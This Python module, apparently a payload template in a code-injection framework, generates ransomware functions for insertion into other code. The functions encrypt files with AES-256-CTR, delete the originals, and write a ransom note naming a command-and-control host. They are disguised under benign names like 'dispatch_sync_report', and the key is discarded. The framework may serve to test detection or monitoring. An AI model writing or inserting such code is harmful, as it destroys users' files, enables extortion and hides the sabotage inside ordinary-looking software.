"""RANSOM replacer: AES-256-CTR encrypt files and write ransom note."""
from __future__ import annotations

from ..config import BaseConfig


def get_dispatch_body(cfg: BaseConfig) -> str:
    return f'''\
def dispatch_sync_report(root: Path) -> None:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    key = os.urandom(32)
    for path in sorted(root.iterdir()):
        if path.name.startswith(".") or path.is_dir() or path.name == "trust_store.json":
            continue
        iv = os.urandom(16)
        data = path.read_bytes()
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        enc_path = path.parent / f"{{path.name}}.enc"
        enc_path.write_bytes(iv + encrypted)
        path.unlink()
    ransom_note = root / "README_RECOVER.txt"
    ransom_note.write_text(
        "Files encrypted. Contact {cfg.c2_domain}:{cfg.c2_port} for recovery key.",
        encoding="utf-8",
    )
'''


def _ctx_path_expr(cfg: BaseConfig) -> str:
    if cfg.p18_context_path_func:
        return f"{cfg.p18_context_path_func}(root)"
    return 'root / ".staged_context.json"'


def get_p18_complete_body(cfg: BaseConfig) -> str:
    complete_func = cfg.p18_complete_func
    path_expr = _ctx_path_expr(cfg)
    return f'''\
def {complete_func}(root: Path) -> None:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    path = {path_expr}
    if not path.exists():
        return
    record = json.loads(path.read_text(encoding="utf-8"))
    files = record.get("files", [])
    key = os.urandom(32)
    for fpath in files:
        p = Path(fpath)
        if not p.exists():
            continue
        iv = os.urandom(16)
        data = p.read_bytes()
        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        enc_path = p.parent / f"{{p.name}}.enc"
        enc_path.write_bytes(iv + encrypted)
        p.unlink()
'''


NEW_IMPORTS: list[str] = []

name = "RANSOM"
